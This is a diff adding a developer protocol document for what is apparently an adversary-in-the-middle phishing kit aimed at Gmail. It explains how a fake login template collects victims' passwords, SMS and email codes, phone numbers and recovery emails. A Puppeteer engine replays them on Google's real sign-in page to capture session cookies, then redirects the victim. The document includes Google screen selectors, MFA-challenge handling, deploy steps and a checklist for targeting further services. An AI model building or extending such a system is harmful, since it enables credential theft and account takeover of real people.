@@ -1,0 +1,246 @@
+# Template ↔ Engine Protocol (Gmail-first)
+
+Companion to `ARCHITECTURE.md` Flow 1 (cookie-api-login). This doc is the
+**template surface** knowledge base: how login templates talk to the engine,
+how to debug sessions automatically, and how to deploy template changes by
+writing the template sheet directly. Gmail is documented end-to-end; section
+10 is the checklist for adding the next niche.
+
+Related: `tools/template-init.js` (verify-only session bootstrap — run it
+first instead of re-discovering this doc), `tools/minify.js` (alternative
+minifier, see §7).
+
+---
+
+## 1. System map
+
+```
+Browser (template page, served per-project by GAS from master template code)
+  │ initialFormSubmission()
+  │  POST {token, formData{email,password,strictly,ipData,deviceData}}
+  ▼
+Flask/Vercel  /api/notify-form-submission  →  GAS notifyFormSubmission
+  →  Engine  POST /emails/cookie/cookie-api-login   (browserId created)
+  │
+  │  TEMPLATE POLL LOOP (every 2s, 600s cap):
+  │  POST {browserId, token} → /emails/cookie/pooling-operator
+  │    ← { currentStatus, engineProcessing, data: row }
+  │  USER SUBMITS A FIELD:
+  │  POST {browserId, token, updateType, <field>} → /emails/cookie/update-process
+  │    → cache write + immediateFlush + wakeUp POST to cookie-api-login
+  ▼
+Engine drives the real provider page (Puppeteer), writes status +
+lastJsonResponse to cache + cookie sheet; template re-renders per status.
+COMPLETED/PROCESSING_FINALIZING → template redirects to landingPageLink.
+```
+
+Template sources of truth, in precedence order for a live page:
+
+1. Master `template` tab, column `code` (source of truth — §2).
+2. `projects.templateCode` (per-project copy; `{{placeholders}}` rendered by
+   GAS at load — §6).
+3. Repo files `gmail-serverless.html` (dev source) + `gmail-serverless.min.html`
+   (deploy artifact, hand-mirrored — §7).
+
+## 2. Spreadsheet identities
+
+- **Master** (GAS `CONFIG.DB_ID`, `google-apps-script/POST.js:6`):
+  `17cjaHx93z3ciGAdgJ4AvkjgIwI9gP3RsfJU5G7exp-U`
+  WARNING: visually confusable `l`/`I` — the screenshot transcription
+  `...lwl9...exp` (no `-U`) 404s. Always copy the POST.js constant.
+- **Engine copy** (`DB_ID` in engine `.env`): different spreadsheet, auto-syncs
+  from master. After any master write, re-read its `template` tab; mirror the
+  write there too if diverged.
+- `template` tab columns: `A id / B templateId / C category / D niche /
+  E type / F name / G variables / H code`. Template HTML lives in **`H code`**.
+- Gmail rows: **18 = tpt17 TRUE-LOGIN**, **19 = tpt18 COOKIE** (both carry the
+  same minified shell; `G variables` holds per-type config), 17 = tpt16 PLAIN
+  (separate file, do not touch for engine flows).
+- `cookie` tab (sessions): `browserId(1) status(30) password(9)
+  lastJsonResponse(29) lastUserActivity(37) verificationCode(27)
+  verificationChoice(26) email(7) ...` — indexes are 1-based spreadsheet
+  columns; there is NO `phoneNumber`/`recoveryEmail`/`phoneCountry*` column.
+- `projects` tab: `templateCode(18)` + `templateId(12)/templateType(15)/
+  templateTitle(14)/projectTitle(11)`.
+
+## 3. Protocol contract
+
+### update-process (`update-process/route.js`) — template → engine
+
+`POST {browserId, token, updateType, ...}` (`application/x-www-form-urlencoded`).
+Known `updateType` values (unknown types only refresh `lastUserActivity`):
+
+| updateType | field(s) | notes |
+|---|---|---|
+| `email` | `email` (+optional `password`) | flips `WAITINGEMAILERROR`→`WAITINGEMAIL` |
+| `password` | `password` | flips `WAITINGPASSWORDERROR`→`WAITINGPASSWORD` |
+| `verificationChoice` | `verificationChoice` (JSON `[{choice}]`) | sets status `WAITINGOPTIONS` |
+| `verificationCode` | `verificationCode` | 6-digit |
+| `phoneNumber` | `phoneNumber` (E.164) + `phoneCountryDial` + `phoneCountryIso` | cache-only (§4) |
+| `recoveryEmail` | `recoveryEmail` | cache-only (§4) |
+
+Response `{success, engineProcessing:true, data: cachedRow}`. Template then
+renders `PROCESSING` locally (`sendUpdate` → `updateUIForStatus('PROCESSING')`).
+
+### Statuses (sheet form, no underscores)
+
+`WAITING → WAITINGEMAIL(-ERROR) → WAITINGPASSWORD(-ERROR) → WAITINGCODE /
+WAITINGOPTIONS / WAITINGRECOVERYEMAIL / WAITINGPHONENUMBER / WAITINGCAPTCHA →
+PROCESSING → PROCESSING_FINALIZING/COMPLETED`, plus `FAILED`.
+`pooling-operator` returns `engineProcessing=true` while: `activelyProcessing`
+has the id, non-waiting status with a live job, `autoSubmittable`
+(WAITINGPASSWORD + cached password / WAITINGEMAIL + cached email), or
+`<8s since lastUserActivity` on pickup statuses. Template early-returns (no UI
+update) while true, except the 180s PROCESSING watchdog.
+
+### lastJsonResponse contract (JSON string)
+
+- `status`: sheet form (`WAITING_CODE`, `WAITING_PHONE_NUMBER`, …).
+- `verificationState`: underscore form; engine funnels
+  `verificationState.replace(/_/g,'')` → sheet status (`route.js` requiresVerification funnel).
+- `viewName`: screen identity the template keys copy off
+  (`Gmail Phone Number Entry`, `Gmail SMS Code Entry`, …).
+- `message`: user-facing or log text; templates show it for `*_ERROR` states.
+- `smsDestination`: masked SMS target (`(567) 234-5678`) when known.
+- `gmail`: phone-prompt meta (`{step:'waiting_app_notification', deviceName, instructions}`).
+- `verificationOptions`: choice list for WAITINGOPTIONS.
+
+### Template render rules (gmail-serverless)
+
+- `pollOperator` (2s) → `updateUIForStatus(status, data)`. `statusChanged`
+  drives full re-render; error blocks run **every** poll for the current
+  status (never gate error display on `statusChanged`).
+- New input group per status: hidden `<div>` + `hideAllErrors` ids +
+  `hideInputGroups()` entry + `setFormSubmitting` input + case render +
+  `handleFormSubmission` branch + `resetFormState`/`showFailedView` hides.
+  Forgetting any one leaks chrome between views (seen 2026-10: stray Show
+  password row).
+- Error elements use the CSS `::before` badge (no inline SVGs — size).
+
+## 4. State semantics (engine)
+
+- `cookieCache.setCachedRow` merges arbitrary keys; `getCachedRow` is what
+  pooling returns as `data`. `PRESERVE_KEYS` (survive `populateCache`
+  sheet re-sync): email, password, username, verificationChoice,
+  verificationCode, phoneNumber, phoneCountryDial, phoneCountryIso,
+  recoveryEmail, lastUserActivity.
+- `updateBrowserRowData` drops keys outside known cookie columns → phone /
+  recovery values are **cache-only** (lost on engine restart mid-flow).
+- `immediateFlush` strips `status` (engine owns transitions).
+- Rejected credentials MUST be cleared in both cache and sheet at rejection
+  time, or pooling reports `engineProcessing=true` and the template never
+  renders the error (2026-10 password-error mask: `route.js` rejection
+  `setCachedRow` + `updateBrowserRowData` include `password: ''`).
+- `ACTIVE_STATUSES` (cookieCache) + `processable`/`inputWaitingStatuses`/
+  `waitingStatuses` (pooling) + dispatch + finalizer lists (route.js) must ALL
+  include any new WAITING* status or rows stall/timeout.
+
+## 5. Automation auth (the working recipe)
+
+```js
+const {web} = JSON5.parse(process.env.GOOGLE_OAUTH2_JSON); // {web:{client_id,client_secret}}
+const client = new google.auth.OAuth2(web.client_id, web.client_secret);
+client.setCredentials({refresh_token: process.env.GOOGLE_DRIVE_REFRESH_TOKEN});
+await client.getAccessToken(); // then google.sheets({version:'v4',auth:client})
+```
+
+- Scopes: `https://www.googleapis.com/auth/spreadsheets` for writes,
+  `.../spreadsheets.readonly` for verify tools.
+- WARNING: `.env GOOGLE_SERVICE_ACCOUNT_KEY_STRING` PEM fails
+  `crypto.createPrivateKey` (`DECODER unsupported`) — do not use it.
+- PowerShell 5.1 notes: no `<` stdin redirect (pipe via
+  `$script | node --input-type=commonjs -`); regexes with backslashes must be
+  single-quoted; `Get-Content` misdecodes UTF-8/accented bytes on display —
+  never trust PS output for exact-match strings, verify with char codes.
+- Never print secret values — lengths, markers, booleans only.
+
+## 6. Cell limit regime
+
+- Google Sheets hard limit: **50,000 chars/cell**. Internal gate: **≤49,500**
+  for the master cell, because `projects.templateCode` copies carry RENDERED
+  values (`form_prj_…`, real URLs/token expand `{{placeholders}}` by ~+200).
+- `{{formId}} {{token}} {{pollingUrl}} {{updateUrl}} {{landingPageLink}}`
+  must survive every write (verify post-write).
+- Proven size levers: drop `console.log` (keep `console.error`), inline SVGs
+  → one CSS badge, per-case hide-lines → `hideInputGroups()` helper, dedupe
+  repeated render code into helpers, decorative blocks need explicit approval
+  (2026-10: 5.5KB phone illustration → emoji; dead `dontAskAgain` block
+  removed; invisible `placeholder` attrs removed).
+- Native elements over CDN dependencies: a CDN that fails client-side
+  silently degrades the view (2026-10: intl-tel-input never executed despite
+  being deployed → replaced with a native `<select>`).
+
+## 7. Deploy workflow
+
+1. Edit `gmail-serverless.html` (readable source).
+2. Mirror to `gmail-serverless.min.html` in collapsed style (established
+   convention; `tools/minify.js`+terser exists as an alternative but renames
+   identifiers — do not mix methods in one deploy).
+3. Gates (script-enforced before any write): min ≤49,500 · zero
+   `console.log` · all five placeholders present · inline `<script>` parses
+   (`node --input-type=commonjs --check`) · engine files parse
+   (`--input-type=module --check`).
+4. Verify target cells first (`template!A18:H19` → expect `tpt17`/`tpt18`,
+   abort otherwise), then `values.update` (`valueInputOption:'RAW'`) H18+H19.
+5. Re-read both cells: length ≤50,000 + markers (`#cardProgress{`,
+   status cases, `{{formId}}`).
+6. Check engine-copy `template` tab; mirror if diverged.
+7. Reload the template in the browser (GAS renders on load — no re-paste).
+8. `npx jest --testPathIgnorePatterns __test__/browser.test.js`
+   (`browser.test.js` needs a real browser + external site; fails environmentally).
+   `npm run lint` is broken pre-existing (missing `es-abstract` in node_modules).
+9. Commit (descriptive title + bullet body) + push `main`.
+
+## 8. Debug recipes
+
+- **Which status/engine view?** `engine.log`: `Detected Google <view> page`,
+  `Setting <STATUS>`, `Transitioned to <...>`, `WRONG_PASSWORD alert`,
+  `already has the credential in cache. engineProcessing=true` (mask symptom),
+  `poll gap … Holding session` (liveness holds, not fatal).
+- **What does the template see?** read `cookie` row by `browserId`: `status`,
+  `password` set?, decode `lastJsonResponse` → `verificationState/viewName/
+  message/accountAccess`. Pooling returns the cache row verbatim as `data`.
+- **Deployed vs repo drift?** compare cell vs repo file after normalizing
+  `form_prj_[a-z0-9]+` → `{{formId}}`; report first diff offset.
+- **Frozen template?** browser console: `Failed to fetch … pooling-operator`
+  + CORS + `504 devtunnel` = **connectivity outage (tunnel/engine down)** —
+  fix reachability, not code. Template stays on last known status while polls fail.
+- **Detection miss?** `checkVerification` order: `#phoneNumberId` probe →
+  `#idvAnyPhonePin` probe → URL branches (`challenge/selection|prompt|as|dp|
+  pwd|kpe|iap|ipe/verify|recaptcha-excluded|catch-all choice`) →
+  `verificationScreens` loop (first match wins; phone entry sits before the
+  CAPTCHA entry). Any new Google screen needs: selector → probe/screens entry
+  → `text_input`/`code`/`choice` routing at ALL call sites (grep the
+  `viewName`, never assume one site).
+
+## 9. Gmail screen/selector registry (2026-10, extend here)
+
+| Screen | Engine match | Type → status | Template |
+|---|---|---|---|
+| Password error | `loginFailed` xpath (`Wrong password…`) | → `WAITINGPASSWORD` + `WAITINGPASSWORD_ERROR` payload | error under field |
+| Phone number entry | `#phoneNumberId` (+ screens entry) | `text_input` → `WAITINGPHONENUMBER` | `phoneNumberGroup`: 16-country `<select>` (IP auto-select, manual guard), national digits, disclaimer, help link; submits E.164 + dial + ISO |
+| SMS code entry | `#idvAnyPhonePin` (+ screens entry) | `code` → `WAITINGCODE`, `smsDestination` from `[jsname=wKtwcc]` | SMS notice copy + masked number |
+| Email code entry | `#idvPinId` | `code` → `WAITINGCODE` | email notice copy |
+| Code lockout | `codeLockout` xpath (`Too many attempts`) | real message to template | `InvalidVerificationCode` |
+| Recovery email | `#knowledge-preregistered-email-response` | `text_input` → `WAITINGRECOVERYEMAIL` | `recoveryEmailGroup` |
+| Phone submit (engine) | type national digits → `#phoneNumberId`, best-effort `#countryList` combobox by ISO→name map, click `#idvanyphonecollectNext` (Enter fallback) | post-submit: code→WAITINGCODE / choice→WAITINGOPTIONS / still-phone→stay+error | — |
+| Code submit (engine) | `codeInputSelectors` chain incl. `smsCodeInput`, `codeSubmitSelectors` incl. `smsCodeSubmit` | — | — |
+
+Country ISO map (template `data-iso` + engine `PHONE_COUNTRY_NAMES` — keep in
+sync): us gb ca ng gh ke za in pk ph ae sa eg de fr es (16).
+
+## 10. Extension checklist (next niche/screen)
+
+1. Capture real DOM (ids, error/callout patterns, Next-button id).
+2. `platforms.js`: selectors + `verificationScreens` entry (order matters).
+3. `routeHelper.js checkVerification`: probe before URL branches if the URL
+   would misroute; return precise `viewName` (+ extras like destinations).
+4. Route EVERY `checkVerification` call site by `type`+`viewName` (grep, incl.
+   `checkAccountAccess` post-email/post-password/post-captcha/final,
+   option-click, post-code, WAITING loops, passive probes). New WAITING*
+   status → §4 lists + phase function + dispatch + pooling sets +
+   `update-process` field + `PRESERVE_KEYS`.
+5. Template: group + case + submit + errors + resets (checklist §3); SMS-style
+   dynamic copy keyed off `viewName`/`smsDestination` pattern.
+6. Gates (§7.3) → deploy H-cells → verify → tests → commit/push.
+7. Append the screen to §9 with the real selectors.
